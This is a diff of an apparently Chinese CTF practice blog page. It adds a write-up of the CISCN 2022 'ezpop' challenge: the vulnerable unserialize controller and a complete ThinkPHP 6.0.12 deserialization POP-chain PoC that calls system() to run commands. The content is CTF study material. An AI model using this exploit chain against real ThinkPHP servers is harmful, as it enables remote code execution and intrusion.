@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019初赛]Love Math</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2019%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-text">[CISCN 2019初赛]Love Math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-text">[CISCN 2022 初赛]ezpop</span></a></li></ol>
     </div>
   
         
@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #03a9f4">刷题</a>
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00a596">刷题</a>
             </span>
             
         </span>
@@ -260,7 +260,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">618字</span>
+        <span class="post-count">1k字</span>
       </span>
     </span>
 
@@ -269,7 +269,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">5分</span>
       </span>
     </span>
     
@@ -375,6 +375,77 @@ i <span class="token operator">=</span> <span class="token number">0</span>
 <span class="token header"><span class="token header-name keyword">1</span><span class="token punctuation">:</span><span class="token header-value">ls /</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/blog/2023/05/05/CISCN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20231020145512230.png" alt="image-20231020145512230"></p>
+<hr>
+<h1 id="CISCN-2022-初赛-ezpop"><a href="#CISCN-2022-初赛-ezpop" class="headerlink" title="[CISCN 2022 初赛]ezpop"></a>[CISCN 2022 初赛]ezpop</h1><blockquote>
+<p>ThinkPHP V6.0.12LTS反序列化漏洞</p>
+</blockquote>
+<p>进入题目，可知框架是ThinkPHP V6.0.12LTS</p>
+<p>dirsearch扫一下，发现存在<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
+<p>网上搜一下，会发现存在反序列化漏洞，具体研究可以移步到我的另一篇文章中（还没写）</p>
+<p>在app&#x2F;controller&#x2F;Index.php中发现反序列化入口</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>:) &lt;/h1>&lt;p> ThinkPHP V'</span> <span class="token operator">.</span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>App</span><span class="token operator">::</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br/>&lt;span style="font-size:30px;">14载初心不改 - 你值得信赖的PHP框架&lt;/span>&lt;/p>&lt;span style="font-size:25px;">[ V6.0 版本由 &lt;a href="https://www.yisu.com/" target="yisu">亿速云&lt;/a> 独家赞助发布 ]&lt;/span>&lt;/div>&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8">&lt;/script>&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js">&lt;/script>&lt;think id="ee9b1aa918103c4fc">&lt;/think>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ThinkPHP6'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'hello,'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+   	<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>poc：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ 
+<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#  这里需要自己进行更改！！！</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>
+ 
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
+    <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>建议用burpsuite发包</p>
 <hr>
 
     </div>
